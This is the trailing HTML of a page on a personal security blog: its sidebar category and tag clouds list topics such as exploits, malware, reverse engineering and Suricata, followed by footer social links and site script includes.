    <a href="https://www.serializing.me/2019/02/27/its-me-fireeye/" title="It&#39;s Me, FireEye!" class="page-link">Older<span>&nbsp;<i class="fas fa-chevron-right"></i>&nbsp;</span></a>
  </li></ul>
  </div>
  
  <div class="col-md-4">
    
    <div class="card my-4">
      <h5 class="card-header">Categories</h5>
      <div class="card-body">
        <div class="cloud">
<a style="font-size: 1.1538461538461537em" href="https://www.serializing.me/categories/bug-bounty/" title="3 posts">bug-bounty</a>
<a style="font-size: 1.2307692307692308em" href="https://www.serializing.me/categories/case-study/" title="4 posts">case-study</a>
<a style="font-size: 1.5384615384615385em" href="https://www.serializing.me/categories/configuration/" title="8 posts">configuration</a>
<a style="font-size: 1.0769230769230769em" href="https://www.serializing.me/categories/cve/" title="2 posts">cve</a>
<a style="font-size: 1em" href="https://www.serializing.me/categories/encryption/" title="1 posts">encryption</a>
<a style="font-size: 1.3076923076923077em" href="https://www.serializing.me/categories/exploit/" title="5 posts">exploit</a>
<a style="font-size: 1.2307692307692308em" href="https://www.serializing.me/categories/hardware-hacking/" title="4 posts">hardware-hacking</a>
<a style="font-size: 1.1538461538461537em" href="https://www.serializing.me/categories/incident-response/" title="3 posts">incident-response</a>
<a style="font-size: 1.1538461538461537em" href="https://www.serializing.me/categories/learning/" title="3 posts">learning</a>
<a style="font-size: 1.8461538461538463em" href="https://www.serializing.me/categories/linux/" title="12 posts">linux</a>
<a style="font-size: 1.3076923076923077em" href="https://www.serializing.me/categories/malware/" title="5 posts">malware</a>
<a style="font-size: 1em" href="https://www.serializing.me/categories/memory-forensics/" title="1 posts">memory-forensics</a>
<a style="font-size: 1.5384615384615385em" href="https://www.serializing.me/categories/network/" title="8 posts">network</a>
<a style="font-size: 1.1538461538461537em" href="https://www.serializing.me/categories/reconnaissance/" title="3 posts">reconnaissance</a>
<a style="font-size: 1.9230769230769231em" href="https://www.serializing.me/categories/reverse-engineering/" title="13 posts">reverse-engineering</a>
<a style="font-size: 1.2307692307692308em" href="https://www.serializing.me/categories/virtualization/" title="4 posts">virtualization</a>
<a style="font-size: 2em" href="https://www.serializing.me/categories/windows/" title="14 posts">windows</a>


        </div>
      </div>
    </div>
    
    <div class="card my-4">
      <h5 class="card-header">Tags</h5>
      <div class="card-body">
        <div class="cloud">
<a style="font-size: 1.5em" href="https://www.serializing.me/tags/active-directory/" title="3 posts">active-directory</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/acunetix-wvs/" title="1 posts">acunetix-wvs</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/android/" title="1 posts">android</a>
<a style="font-size: 1.25em" href="https://www.serializing.me/tags/applocker/" title="2 posts">applocker</a>
<a style="font-size: 1.25em" href="https://www.serializing.me/tags/aruba-networks/" title="2 posts">aruba-networks</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/attck/" title="1 posts">attck</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/banking/" title="1 posts">banking</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/bios/" title="1 posts">bios</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/brute-force/" title="1 posts">brute-force</a>
<a style="font-size: 1.5em" href="https://www.serializing.me/tags/bugcrowd/" title="3 posts">bugcrowd</a>
<a style="font-size: 1.5em" href="https://www.serializing.me/tags/cac-ipc/" title="3 posts">cac-ipc</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/cheat/" title="1 posts">cheat</a>
<a style="font-size: 1.5em" href="https://www.serializing.me/tags/cisco-anyconnect/" title="3 posts">cisco-anyconnect</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/code-injection/" title="1 posts">code-injection</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/csharp/" title="1 posts">csharp</a>
<a style="font-size: 1.25em" href="https://www.serializing.me/tags/cuckoo-sandbox/" title="2 posts">cuckoo-sandbox</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/e-gpu/" title="1 posts">e-gpu</a>
<a style="font-size: 1.75em" href="https://www.serializing.me/tags/emofishes/" title="4 posts">emofishes</a>
<a style="font-size: 1.5em" href="https://www.serializing.me/tags/emotions/" title="3 posts">emotions</a>
<a style="font-size: 1.5em" href="https://www.serializing.me/tags/fireeye/" title="3 posts">fireeye</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/gpo-bypass/" title="1 posts">gpo-bypass</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/group-policy-objects/" title="1 posts">group-policy-objects</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/honeypot/" title="1 posts">honeypot</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/hook-functions/" title="1 posts">hook-functions</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/hp/" title="1 posts">hp</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/hpqpswdd/" title="1 posts">hpqpswdd</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/hugo/" title="1 posts">hugo</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/ivre/" title="1 posts">ivre</a>
<a style="font-size: 1.25em" href="https://www.serializing.me/tags/lemp/" title="2 posts">lemp</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/metasploit/" title="1 posts">metasploit</a>
<a style="font-size: 1.5em" href="https://www.serializing.me/tags/paranoid-fish/" title="3 posts">paranoid-fish</a>
<a style="font-size: 1.75em" href="https://www.serializing.me/tags/passwords/" title="4 posts">passwords</a>
<a style="font-size: 1.25em" href="https://www.serializing.me/tags/portuguese/" title="2 posts">portuguese</a>
<a style="font-size: 1.5em" href="https://www.serializing.me/tags/powascripts/" title="3 posts">powascripts</a>
<a style="font-size: 1.75em" href="https://www.serializing.me/tags/powershell/" title="4 posts">powershell</a>
<a style="font-size: 2em" href="https://www.serializing.me/tags/qemu/" title="5 posts">qemu</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/raspberry-pi/" title="1 posts">raspberry-pi</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/razer/" title="1 posts">razer</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/red-team/" title="1 posts">red-team</a>
<a style="font-size: 1.5em" href="https://www.serializing.me/tags/soho/" title="3 posts">soho</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/ssh/" title="1 posts">ssh</a>
<a style="font-size: 2em" href="https://www.serializing.me/tags/suricata/" title="5 posts">suricata</a>
<a style="font-size: 1.5em" href="https://www.serializing.me/tags/technicolor/" title="3 posts">technicolor</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/titan-quest/" title="1 posts">titan-quest</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/tls/" title="1 posts">tls</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/tq-invincible/" title="1 posts">tq-invincible</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/usb/" title="1 posts">usb</a>
<a style="font-size: 1.5em" href="https://www.serializing.me/tags/virtualbox/" title="3 posts">virtualbox</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/volatility/" title="1 posts">volatility</a>
<a style="font-size: 1.5em" href="https://www.serializing.me/tags/wordpress/" title="3 posts">wordpress</a>
<a style="font-size: 1em" href="https://www.serializing.me/tags/yara/" title="1 posts">yara</a>


        </div>
      </div>
    </div>
  </div>
</div>



    </section>
    <footer class="mt-4 bg-dark">
<div class="container">
  <div class="row text-center">
  <div class="col-12 col-md my-4">
    <ul class="list-inline">

      <li class="list-inline-item">
        <a rel="me" class="footer-link text-light" href="https://infosec.exchange/@serializingme" title="Mastodon">
          <span class="fa-stack fa-lg">
            <i class="fas fa-square fa-stack-2x text-light"></i>
            <i class="fab fa-mastodon fa-stack-1x text-secondary"></i>
          </span>
        </a>
      </li>

      <li class="list-inline-item">
        <a rel="me" class="footer-link text-light" href="https://www.twitch.tv/serializingme" title="Twitch">
          <span class="fa-stack fa-lg">
            <i class="fas fa-square fa-stack-2x text-light"></i>
            <i class="fab fa-twitch fa-stack-1x text-secondary"></i>
          </span>
        </a>
      </li>

      <li class="list-inline-item">
        <a rel="me" class="footer-link text-light" href="https://discord.gg/NS5qHT4" title="Discord">
          <span class="fa-stack fa-lg">
            <i class="fas fa-square fa-stack-2x text-light"></i>
            <i class="fab fa-discord fa-stack-1x text-secondary"></i>
          </span>
        </a>
      </li>

      <li class="list-inline-item">
        <a rel="me" class="footer-link text-light" href="https://www.youtube.com/serializingme" title="YouTube">
          <span class="fa-stack fa-lg">
            <i class="fas fa-square fa-stack-2x text-light"></i>
            <i class="fab fa-youtube fa-stack-1x text-secondary"></i>
          </span>
        </a>
      </li>

      <li class="list-inline-item">
        <a rel="me" class="footer-link text-light" href="https://github.com/serializingme" title="GitHub">
          <span class="fa-stack fa-lg">
            <i class="fas fa-square fa-stack-2x text-light"></i>
            <i class="fab fa-github fa-stack-1x text-secondary"></i>
          </span>
        </a>
      </li>

      <li class="list-inline-item">
        <a rel="me" class="footer-link text-light" href="https://bugcrowd.com/serializingme" title="Bugcrowd">
          <span class="fa-stack fa-lg">
            <i class="fas fa-square fa-stack-2x text-light"></i>
            <i class="fas fa-bug fa-stack-1x text-secondary"></i>
          </span>
        </a>
      </li>

      <li class="list-inline-item">
        <a rel="me" class="footer-link text-light" href="https://twitter.com/serializingme" title="Twitter">
          <span class="fa-stack fa-lg">
            <i class="fas fa-square fa-stack-2x text-light"></i>
            <i class="fab fa-twitter fa-stack-1x text-secondary"></i>
          </span>
        </a>
      </li>

    </ul>
      <ul class="list-inline">

    <li class="list-inline-item">
      <span class="fa-lg text-secondary"><i class="fas fa-copyright"></i>&nbsp;</span><a class="footer-link text-light" href="/licensing/" title="Licensing">Licensing</a>
    </li>

    <li class="list-inline-item">
      <span class="fa-lg text-secondary"><i class="fas fa-eye"></i>&nbsp;</span><a class="footer-link text-light" href="/privacy/" title="Privacy">Privacy</a>
    </li>

    <li class="list-inline-item">
      <span class="fa-lg text-secondary"><i class="fas fa-shield-alt"></i>&nbsp;</span><a class="footer-link text-light" href="/security/" title="Security">Security</a>
    </li>

    <li class="list-inline-item">
      <span class="fa-lg text-secondary"><i class="fas fa-envelope"></i>&nbsp;</span><a class="footer-link text-light" href="/contacts/" title="Contacts">Contacts</a>
    </li>

    <li class="list-inline-item">
      <span class="fa-lg text-secondary"><i class="fas fa-rss"></i>&nbsp;</span><a class="footer-link text-light" href="/feeds/" title="Feeds">Feeds</a>
    </li>

  </ul>
  <small class="d-block mb-3 text-muted">&copy;&nbsp;2023&nbsp;Duarte Silva</small>
  </div>
</div>
</div>

    </footer>
<script src="https://www.serializing.me/js/jquery.min.js"></script>
<script src="https://www.serializing.me/js/bootstrap.min.js"></script>
<script src="https://www.serializing.me/js/fontawesome-solid.min.js"></script>
<script src="https://www.serializing.me/js/fontawesome-brands.min.js"></script>
<script src="https://www.serializing.me/js/fontawesome.min.js"></script><script src="https://www.serializing.me/js/serializingme.min.js"></script>
  </body>
</html>
